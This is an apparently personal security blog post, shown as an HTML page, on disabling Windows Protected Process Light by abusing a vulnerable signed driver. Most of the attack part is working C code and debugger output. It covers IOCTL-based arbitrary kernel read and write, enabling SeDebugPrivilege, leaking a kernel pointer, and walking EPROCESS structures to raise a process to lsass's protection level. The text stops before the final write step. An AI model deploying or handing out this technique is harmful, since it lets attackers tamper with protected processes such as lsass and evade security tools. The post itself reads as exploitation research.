<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.814233750388">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.11.0">

    <!-- Primary Meta Tags -->
    <title>Disabling PPL with a LOLDriver</title>
    <meta name="title" content="Disabling PPL with a LOLDriver">
    <meta name="description" content="As I keep looking into this windows 11 thing I wanted to have a go at disabling PPL by using a LOLDriver as that seems to be a thing APTs are doing.">

    <!-- Canonical -->
    <link rel="canonical" href="https://eljayright.github.io/windows-driver-exploitation/loldriver_ppl/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://eljayright.github.io/windows-driver-exploitation/loldriver_ppl/">
    <meta property="og:title" content="Disabling PPL with a LOLDriver">
    <meta property="og:description" content="As I keep looking into this windows 11 thing I wanted to have a go at disabling PPL by using a LOLDriver as that seems to be a thing APTs are doing.">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://eljayright.github.io/windows-driver-exploitation/loldriver_ppl/">
    <meta property="twitter:title" content="Disabling PPL with a LOLDriver">
    <meta property="twitter:description" content="As I keep looking into this windows 11 thing I wanted to have a go at disabling PPL by using a LOLDriver as that seems to be a thing APTs are doing.">

    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>

    <link href="../../resources/css/retype.css?v=3.11.0.814233750388" rel="stylesheet">

    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.814233750388" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.814233750388" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.814233750388" defer></script>
</head>
<body>
    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
    
        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="retype-branding-logo" href="../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ElJayRight</span>
                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">dev-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav id="retype-header-nav" class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/eljayright" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="retype-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
    
        <div id="retype-container" class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
            
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/eljayright" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 bg-body-bg">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="retype-markdown" id="retype-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="retype-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="disabling-ppl-with-a-loldriver" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#disabling-ppl-with-a-loldriver">#</doc-anchor-trigger>
        <span>Disabling PPL with a LOLDriver</span>
    </h1>
</doc-anchor-target>
<doc-anchor-target id="outline">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#outline">#</doc-anchor-trigger>
        <span>Outline</span>
    </h2>
</doc-anchor-target>
<p>As I keep looking into this windows 11 thing I wanted to have a go at disabling PPL by using a LOLDriver as that seems to be a thing APTs are doing. Also going to see if there are any difference to the general windows 10 kernel exploitation setup functions.</p>
<doc-anchor-target id="the-issue">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#the-issue">#</doc-anchor-trigger>
        <span>The issue</span>
    </h2>
</doc-anchor-target>
<p>What is PPL and why is it annoying?
A while ago windows thought it would be a good idea to implement some form of access control around process handles and implemented Protected Process. With this came 3 Protection levels; Protected Process, Protected Process Light (PPL) and none. When a process requests a handle to a different process the kernel will check what level each process is and will only grant access if the process is of equal level or higher. So a PPL process can access a <code v-pre>none</code> process and a PPL process but not a Protected Process.</p>
<p>So why not just create a process with the level Protected Process and call it a day?
To do this the process has to be signed by Microsoft and pass a few other checks.</p>
<p>So instead of trying to target this from userland, why dont we look at it from the kernel. Enter LOLDrivers.</p>
<p>Living Of the Land Drivers (LOLDrivers) are (normally) thrid party drivers that contain a vulnerability or abusable feature allowing for kernel primitives, such as a read and/or write. These drivers are also signed allowing to load them with sc.exe.</p>
<p>There is a project which has a heap of them to use: <a href="https://www.loldrivers.io/">https://www.loldrivers.io/</a> (most are blocked by default but maybe one or two are not :) )</p>
<p>Just like most things related to process the Protection level can be found within the <code v-pre>EPROCESS</code> structure under <code v-pre>_PS_PROTECTION</code> Looking at the structures in windbg we can verify this and get the offsets.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">0: kd&gt; dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x1c8 ProcessLock      : _EX_PUSH_LOCK
   +0x1d0 UniqueProcessId  : Ptr64 Void
   +0x1d8 ActiveProcessLinks : _LIST_ENTRY
   ... snip ...
   +0x5fa Protection       : _PS_PROTECTION

0: kd&gt; dt nt!_PS_PROTECTION
   +0x000 Level            : UChar
   +0x000 Type             : Pos 0, 3 Bits
   +0x000 Audit            : Pos 3, 1 Bit
   +0x000 Signer           : Pos 4, 4 Bits</code></pre>
</doc-codeblock></div>
<p>Lets check the levels of 2 process, a random cmd.exe spawned by a non admin user and lsass.exe</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">0: kd&gt; !process 0 0
**** NT ACTIVE PROCESS DUMP ****
PROCESS ffffbd0390690040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ae000  ObjectTable: ffff998c372d1e80  HandleCount: 3430.
    Image: System
... snip ...
PROCESS ffffbd0393876080
    SessionId: none  Cid: 0330    Peb: c9756bd000  ParentCid: 0294
    DirBase: 263526000  ObjectTable: ffff998c3763fc40  HandleCount: 1656.
    Image: lsass.exe
... snip ...
PROCESS ffffbd0396fad080
    SessionId: none  Cid: 1d2c    Peb: e8b9d89000  ParentCid: 1278
    DirBase: 1c7b10000  ObjectTable: ffff998c40813480  HandleCount:  74.
    Image: cmd.exe

# Check lsass:
0: kd&gt; dt nt!_PS_PROTECTION ffffbd0393876080+5fa
   +0x000 Level            : 0x41 'A'
   +0x000 Type             : 0y001
   +0x000 Audit            : 0y0
   +0x000 Signer           : 0y0100

# Check cmd:
0: kd&gt; dt nt!_PS_PROTECTION ffffbd0396fad080+5fa
   +0x000 Level            : 0 ''
   +0x000 Type             : 0y000
   +0x000 Audit            : 0y0
   +0x000 Signer           : 0y0000</code></pre>
</doc-codeblock></div>
<p>Looking into the Type and Signer field for the structure gives us a bit more information:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">0: kd&gt; dt nt!_PS_PROTECTED_TYPE
   PsProtectedTypeNone = 0n0
   PsProtectedTypeProtectedLight = 0n1
   PsProtectedTypeProtected = 0n2
   PsProtectedTypeMax = 0n3

0: kd&gt; dt nt!_PS_PROTECTED_SIGNER
   PsProtectedSignerNone = 0n0
   PsProtectedSignerAuthenticode = 0n1
   PsProtectedSignerCodeGen = 0n2
   PsProtectedSignerAntimalware = 0n3
   PsProtectedSignerLsa = 0n4
   PsProtectedSignerWindows = 0n5
   PsProtectedSignerWinTcb = 0n6
   PsProtectedSignerWinSystem = 0n7
   PsProtectedSignerApp = 0n8
   PsProtectedSignerMax = 0n9</code></pre>
</doc-codeblock></div>
<p>So lsass would be a PPL process signed with lsa. With the above in mind if we are able to change the memory for cmd.exe to be the same as lsass we would be able to get access to the process.</p>
<doc-anchor-target id="how-to-weaponise-a-driver">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#how-to-weaponise-a-driver">#</doc-anchor-trigger>
        <span>How to weaponise a driver</span>
    </h2>
</doc-anchor-target>
<p>For this we need to find an arbitrary write primitive in a driver with a valid signature that we can abuse. Picking a random driver from loldrivers (link) i picked wnbios.sys. It is being used in the RealBlindingEDR so we can use the same ioctl to get an arb read and write. (weaponising a driver is sorta just a side point right now.)</p>
<p>Super quick overview of how drivers work.</p>
<p>To talk to drivers you use IOCTLs which take input run a code path in the kernel and sometimes give output. If an IOCTL does not verify the data that is being passed into it you might be able to get powerful kernel primitives.</p>
<doc-anchor-target id="weaponising-the-driver">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#weaponising-the-driver">#</doc-anchor-trigger>
        <span>Weaponising the driver</span>
    </h2>
</doc-anchor-target>
<p>Looking at the source code we can copy the read and write primitives (I&#x27;m to lazy to find and then burn a driver Nday for a blog :D ):</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">struct DellBuff {
	ULONGLONG pad1 = 0x4141414141414141;
	ULONGLONG Address = 0;
	ULONGLONG three1 = 0x0000000000000000;
	ULONGLONG value = 0x0000000000000000;
} DellBuff;

DWORD64 DellRead(VOID* Address) {
	struct DellBuff ReadBuff = {};
	ReadBuff.Address = (DWORD64)Address;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC4, &amp;ReadBuff, sizeof(ReadBuff), &amp;ReadBuff, sizeof(ReadBuff), &amp;BytesRead, NULL);
	if (!success) {
		printf(&quot;Memory read failed. 1\n&quot;);
		CloseHandle(hDevice);
	}

	//printf(&quot;%d\n&quot;, BytesRead);
	return ReadBuff.value;
}


VOID DellWrite(VOID* Address, LONGLONG value) {
	struct DellBuff WriteBuff = {};
	WriteBuff.Address = (DWORD64)Address;
	WriteBuff.value = value;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC8, &amp;WriteBuff, sizeof(WriteBuff), &amp;WriteBuff, sizeof(WriteBuff), &amp;BytesRead, NULL);
	if (!success) {
		printf(&quot;Memory read failed. 2\n&quot;);
		CloseHandle(hDevice);
	}
	//printf(&quot;%d\n&quot;, BytesRead);
}</code></pre>
</doc-codeblock></div>
<p>Unlike windbg we are not able to find the eprocess of random processes instead we have to traverse them via the ActiveProcessLinks element of the EProcess structure. We can then check the PID to make sure it is the right process:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">+0x1d0 UniqueProcessId  : Ptr64 Void
+0x1d8 ActiveProcessLinks : _LIST_ENTRY</code></pre>
</doc-codeblock></div>
<p>We can use NtQuerySystemInformation to get the base of the eprocess structure for the kernel then iterate from there using the read primitive.</p>
<p>Before that, a quick note:
Since windows 11 24H2 NtQuerySystemInformation will no longer return a kernel pointer unless the process is running with SeDebugPrivilege enabled.
<a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></p>
<p>So let&#x27;s also add that. (As this already assumes you are admin)</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">LSTATUS RequirePrivilege(LPCTSTR lpPrivilege) {
	HANDLE hToken;
	BOOL bErr = FALSE;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	bErr = LookupPrivilegeValue(NULL, lpPrivilege, &amp;luid); // lookup LUID for privilege on local system
	if (bErr != TRUE) {
		return -1;
	}
	bErr = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken);
	if (bErr != TRUE) {
		return -2;

	}

	if (ANYSIZE_ARRAY != 1) {
		return -3;
	}
	tp.PrivilegeCount = 1; // only adjust one privilege
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	bErr = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	// check GetLastError() to check if privilege has been changed
	if (bErr != TRUE || GetLastError() != ERROR_SUCCESS) {
		printf(&quot;AdjustTokenPriv failed with error: %d\n&quot;, GetLastError());
		return -4;
	}
	printf(&quot;[+] Added privilege\n&quot;);
	CloseHandle(hToken);
	return 0;
}</code></pre>
</doc-codeblock></div>
<p>Kernel leak:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

typedef NTSTATUS(WINAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef ULONGLONG QWORD;
QWORD get_systemeproc() {
	ULONG returnedlength = 0;
	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;NtQuerySystemInformation&quot;);
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);

	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnedlength);
	SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleInfo = handleTableInformation-&gt;Handles[0];
	return (QWORD)HandleInfo.Object;
}</code></pre>
</doc-codeblock></div>
<p>Then the loop to find the eprocess for our PID.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">int main(int arc, char* argv[]) {

	int result = RequirePrivilege(TEXT(&quot;SeDebugPrivilege&quot;));
	if (result != 0) {
		printf(&quot;Priv failed with error %d\n&quot;, result);
		return -1;
	}

	hDriver = CreateFileA(&quot;\\\\.\\DBUtil_2_3&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	QWORD system_eproc = get_systemeproc();
	printf(&quot;[+] System eproc value: 0x%llx\n&quot;, system_eproc);
	QWORD current_eproc = system_eproc;
	DWORD program_pid = GetCurrentProcessId();

	DWORD current_pid = 0;

	while (TRUE) {
		printf(&quot;[+] Reading value from: 0x%llX\n&quot;, current_eproc + (QWORD)ActiveProcessLinks_offset);
		current_eproc = DellRead(current_eproc + (QWORD)ActiveProcessLinks_offset);
		printf(&quot;[+] ForwardLinked value: 0x%llX\n&quot;, current_eproc);
		current_eproc -= ActiveProcessLinks_offset;

		printf(&quot;[+] New EProcess Value: 0x%llX\n&quot;, current_eproc);

		current_pid = DellRead(current_eproc + UniqueProcessId_offset);
		if (current_pid == program_pid) {
			printf(&quot;[+] Found program pid\n&quot;);
			break; // use the current_eproc value
		}
	}
	printf(&quot;[+] EProcess Value for running process: 0x%llX\n&quot;, current_eproc);
	getchar();

}</code></pre>
</doc-codeblock></div>
<p>We can run this with a debugger hooked up to check if the read and offsets are correct.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-c"><code v-pre class="language-c">.\loldriver_client.exe
[+] Added privilege
PID: 4
Pointer: ffff8b064c68c040
[+] System eproc value: 0xffff8b064c68c040
[+] Reading value from: 0xFFFF8B064C68C218
[+] ForwardLinked value: 0xFFFF8B064C7A9258
[+] New EProcess Value: 0xFFFF8B064C7A9080
... snip ...
[+] EProcess Value for running process: 0xFFFF8B0652D3C080

--- debuger ---
PROCESS ffff8b0652d3c080
    SessionId: none  Cid: 26d0    Peb: a488481000  ParentCid: 0550
    DirBase: 1969b7000  ObjectTable: ffffe406a567a680  HandleCount:  67.
    Image: loldriver_client.exe</code></pre>
</doc-codeblock></div>
<p>Now we can read the 8 bytes which will include the protection level and update the process to be the same level as lsass.exe</p>
<div class="codeblock-wrapper"><doc-codeblock>
